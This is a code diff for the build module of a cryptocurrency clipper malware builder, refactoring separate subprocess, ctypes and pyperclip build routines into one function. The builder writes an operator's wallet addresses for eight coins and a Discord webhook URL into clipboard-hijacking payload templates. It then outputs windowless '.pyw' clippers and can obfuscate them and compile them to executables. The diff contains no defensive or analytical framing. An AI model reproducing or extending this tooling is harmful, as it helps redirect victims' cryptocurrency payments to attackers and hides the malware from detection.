@@ -167,172 +167,8 @@ class build:
             rm_file_path = str(new_file_name).replace(".pyw", ".spec")
             os.remove(rm_file_path)
             CTkMessagebox(title="info", message=f"process completed after {final_time}s. .exe can be found in output/dist_obfuscated and .pyw for code analysis can be found in output/{new_file_name}")
-
-    def build_subprocess(single_use, obfuscate, exe_file):
-        if single_use == "on":
-            single_use = True
-        else:
-            single_use = False
-        if ping_discord_checkbox.get() == "on":
-            ping = True
-        else:
-            ping = False
-        
-        btc_addr = btc_addr1
-        eth_addr = eth_addr1
-        ltc_addr = ltc_addr1
-        xmr_addr = xmr_addr1
-        sol_addr = sol_addr1
-        doge_addr = doge_addr1  
-        xrp_addr = xrp_addr1
-        trx_addr = trx_addr1
-
-        if btc_addr == "":
-            btc_addr = "SET BTC ADDRESS HERE"
-        if eth_addr == "":
-            eth_addr = "SET ETH ADDRESS HERE"
-        if ltc_addr == "":
-            ltc_addr = "SET LTC ADDRESS HERE"
-        if xmr_addr == "":
-            xmr_addr = "SET XMR ADDRESS HERE"
-        if sol_addr == "":
-            sol_addr = "SET SOL ADDRESS HERE"
-        if doge_addr == "":
-            doge_addr = "SET DOGE ADDRESS HERE"
-        if xrp_addr == "":
-            xrp_addr = "SET XRP ADDRESS HERE"
-        if trx_addr == "":
-            trx_addr = "SET TRX ADDRESS HERE"
-        
-        with open("scripts\\subprocess_method.pyw", "r") as file:
-            script_content = file.read()
-        
-        with open("scripts\\temp.pyw", "w") as file:
-            file.write(script_content)
-            file.close()
-        
-        with open("scripts\\temp.pyw", "r") as file:
-            script_content = file.read()
-        
-        script_content = script_content.replace('btcaddr = "SET BTC ADDRESS HERE"', f"btcaddr = '{btc_addr}'")
-        script_content = script_content.replace('ethaddr = "SET ETH ADDRESS HERE"', f"ethaddr = '{eth_addr}'")
-        script_content = script_content.replace('ltcaddr = "SET LTC ADDRESS HERE"', f"ltcaddr = '{ltc_addr}'")
-        script_content = script_content.replace('xmraddr = "SET XMR ADDRESS HERE"', f"xmraddr = '{xmr_addr}'")
-        script_content = script_content.replace('soladdr = "SET SOL ADDRESS HERE"', f"soladdr = '{sol_addr}'")
-        script_content = script_content.replace('dogeaddr = "SET DOGE ADDRESS HERE"', f"dogeaddr = '{doge_addr}'")
-        script_content = script_content.replace('xrpaddr = "SET XRP ADDRESS HERE"', f"xrpaddr = '{xrp_addr}'")
-        script_content = script_content.replace('trxaddr = "SET TRX ADDRESS HERE"', f"trxaddr = '{trx_addr}'")
-
-        script_content = script_content.replace('single_use = False', f'single_use = {single_use}')
-        script_content = script_content.replace('webhook_url = ""', f'webhook_url = "{webhook_url1}"')
-        script_content = script_content.replace('ping = False', f'ping = {ping}')
-
-        if out_name.get().strip() == "":
-            new_file_name = "subprocess_clipper.pyw"
-
-            with open(os.path.join("output", new_file_name), "w") as new_file:
-                new_file.write(script_content)
-        else:
-            if ".pyw" not in out_name.get().strip():
-                check_valid_btn.configure(text="build", command=lambda: build.check_type(), state="normal")
-                CTkMessagebox(title="error", message="file must end in .pyw (python windowless)", icon="cancel")
-            else:
-                new_file_name = out_name.get().strip().replace(" ", "")
-                with open(os.path.join("output", new_file_name), "w") as new_file:
-                    new_file.write(script_content)
-        
-        if obfuscate == "on":
-            current_path = os.path.join("output", new_file_name)
-            build.obfuscate(current_path, new_file_name)
-        if exe_file == "on":
-            current_path = os.path.join("output", new_file_name)
-            build.exe(current_path, new_file_name)
-
-        os.remove("scripts/temp.pyw")
-
-    def build_ctypes(single_use, obfuscate, exe_file):
-        if single_use == "on":
-            single_use = True
-        else:
-            single_use = False
-        if ping_discord_checkbox.get() == "on":
-            ping = True
-        else:
-            ping = False
-        
-        btc_addr = btc_addr1
-        eth_addr = eth_addr1
-        ltc_addr = ltc_addr1
-        xmr_addr = xmr_addr1
-        sol_addr = sol_addr1
-        doge_addr = doge_addr1  
-        xrp_addr = xrp_addr1
-        trx_addr = trx_addr1
-
-        if btc_addr == "":
-            btc_addr = "SET BTC ADDRESS HERE"
-        if eth_addr == "":
-            eth_addr = "SET ETH ADDRESS HERE"
-        if ltc_addr == "":
-            ltc_addr = "SET LTC ADDRESS HERE"
-        if xmr_addr == "":
-            xmr_addr = "SET XMR ADDRESS HERE"
-        if sol_addr == "":
-            sol_addr = "SET SOL ADDRESS HERE"
-        if doge_addr == "":
-            doge_addr = "SET DOGE ADDRESS HERE"
-        if xrp_addr == "":
-            xrp_addr = "SET XRP ADDRESS HERE"
-        if trx_addr == "":
-            trx_addr = "SET TRX ADDRESS HERE"
-        
-        with open("scripts\\ctypes_method.pyw", "r") as file:
-            script_content = file.read()
-        
-        with open("scripts\\temp.pyw", "w") as file:
-            file.write(script_content)
-            file.close()
-        
-        with open("scripts\\temp.pyw", "r") as file:
-            script_content = file.read()
-        
-        script_content = script_content.replace('btcaddr = "SET BTC ADDRESS HERE"', f"btcaddr = '{btc_addr}'")
-        script_content = script_content.replace('ethaddr = "SET ETH ADDRESS HERE"', f"ethaddr = '{eth_addr}'")
-        script_content = script_content.replace('ltcaddr = "SET LTC ADDRESS HERE"', f"ltcaddr = '{ltc_addr}'")
-        script_content = script_content.replace('xmraddr = "SET XMR ADDRESS HERE"', f"xmraddr = '{xmr_addr}'")
-        script_content = script_content.replace('soladdr = "SET SOL ADDRESS HERE"', f"soladdr = '{sol_addr}'")
-        script_content = script_content.replace('dogeaddr = "SET DOGE ADDRESS HERE"', f"dogeaddr = '{doge_addr}'")
-        script_content = script_content.replace('xrpaddr = "SET XRP ADDRESS HERE"', f"xrpaddr = '{xrp_addr}'")
-        script_content = script_content.replace('trxaddr = "SET TRX ADDRESS HERE"', f"trxaddr = '{trx_addr}'")
-
-        script_content = script_content.replace('single_use = False', f'single_use = {single_use}')
-        script_content = script_content.replace('webhook_url = ""', f'webhook_url = "{webhook_url1}"')
-        script_content = script_content.replace('ping = False', f'ping = {ping}')
-
-        if out_name.get().strip() == "":
-            new_file_name = "ctypes_clipper.pyw"
-
-            with open(os.path.join("output", new_file_name), "w") as new_file:
-                new_file.write(script_content)
-        else:
-            if ".pyw" not in out_name.get().strip():
-                check_valid_btn.configure(text="build", command=lambda: build.check_type(), state="normal")
-                CTkMessagebox(title="error", message="file must end in .pyw (python windowless)", icon="cancel")
-            else:
-                new_file_name = out_name.get().strip().replace(" ", "")
-                with open(os.path.join("output", new_file_name), "w") as new_file:
-                    new_file.write(script_content)       
-        
-        if obfuscate == "on":
-            current_path = os.path.join("output", new_file_name)
-            build.obfuscate(current_path, new_file_name)
-        if exe_file == "on":
-            current_path = os.path.join("output", new_file_name)
-            build.exe(current_path, new_file_name)
-
-        os.remove("scripts/temp.pyw")
-
-    def build_pyperclip(single_use, obfuscate, exe_file):
+    
+    def build_method(single_use, obfuscate, exe_file, methodtype):
         if single_use_checkbox.get() == "on":
             single_use = True
         else:
@@ -368,16 +204,23 @@ class build:
         if trx_addr == "":
             trx_addr = "SET TRX ADDRESS HERE"
         
-        with open("scripts\\pyperclip_method.pyw", "r") as file:
-            script_content = file.read()
-        
+        if methodtype == "subprocess":
+            with open("scripts\\subprocess_method.pyw", "r") as file:
+                script_content = file.read()
+        if methodtype == "ctypes":
+            with open("scripts\\ctypes_method.pyw", "r") as file:
+                script_content = file.read()
+        if methodtype == "pyperclip":
+            with open("scripts\\pyperclip_method.pyw", "r") as file:
+                script_content = file.read()
+            
         with open("scripts\\temp.pyw", "w") as file:
             file.write(script_content)
             file.close()
-        
+            
         with open("scripts\\temp.pyw", "r") as file:
             script_content = file.read()
-        
+
         script_content = script_content.replace('btcaddr = "SET BTC ADDRESS HERE"', f"btcaddr = '{btc_addr}'")
         script_content = script_content.replace('ethaddr = "SET ETH ADDRESS HERE"', f"ethaddr = '{eth_addr}'")
         script_content = script_content.replace('ltcaddr = "SET LTC ADDRESS HERE"', f"ltcaddr = '{ltc_addr}'")
@@ -391,11 +234,24 @@ class build:
         script_content = script_content.replace('webhook_url = ""', f'webhook_url = "{webhook_url1}"')
         script_content = script_content.replace('ping = False', f'ping = {ping}')
 
-        if out_name.get().strip() == "":
-            new_file_name = "pyperclip_clipper.pyw"
+        if methodtype == "subprocess":
+            if out_name.get().strip() == "":
+                new_file_name = "subprocess_clipper.pyw"
 
-            with open(os.path.join("output", new_file_name), "w") as new_file:
-                new_file.write(script_content)
+                with open(os.path.join("output", new_file_name), "w") as new_file:
+                    new_file.write(script_content)
+        elif methodtype == "ctypes":
+            if out_name.get().strip() == "":
+                new_file_name = "ctypes_clipper.pyw"
+
+                with open(os.path.join("output", new_file_name), "w") as new_file:
+                    new_file.write(script_content)
+        elif methodtype == "pyperclip":
+            if out_name.get().strip() == "":
+                new_file_name = "pyperclip_clipper.pyw"
+
+                with open(os.path.join("output", new_file_name), "w") as new_file:
+                    new_file.write(script_content)
         else:
             if ".pyw" not in out_name.get().strip():
                 check_valid_btn.configure(text="build", command=lambda: build.check_type(), state="normal")
@@ -403,8 +259,8 @@ class build:
             else:
                 new_file_name = out_name.get().strip().replace(" ", "")
                 with open(os.path.join("output", new_file_name), "w") as new_file:
-                    new_file.write(script_content)       
-        
+                    new_file.write(script_content)   
+
         if obfuscate == "on":
             current_path = os.path.join("output", new_file_name)
             build.obfuscate(current_path, new_file_name)
@@ -419,11 +275,14 @@ class build:
         time.sleep(1)
 
         if type == "subprocess (0 external modules - best)":
-            build.build_subprocess(single_use, obfuscate, exe_file)
+            methodtype = "subprocess"
+            build.build_method(single_use, obfuscate, exe_file, methodtype)
         if type == "ctypes (0 external modules - second best can be buggy)":
-            build.build_ctypes(single_use, obfuscate, exe_file)
+            methodtype = "ctypes"
+            build.build_method(single_use, obfuscate, exe_file, methodtype)
         if type == "pyperclip (1 external module - worst)":
-            build.build_pyperclip(single_use, obfuscate, exe_file)
+            methodtype = "pyperclip"
+            build.build_method(single_use, obfuscate, exe_file, methodtype)
             
 class buildclipperconfig:
     class_called = 0
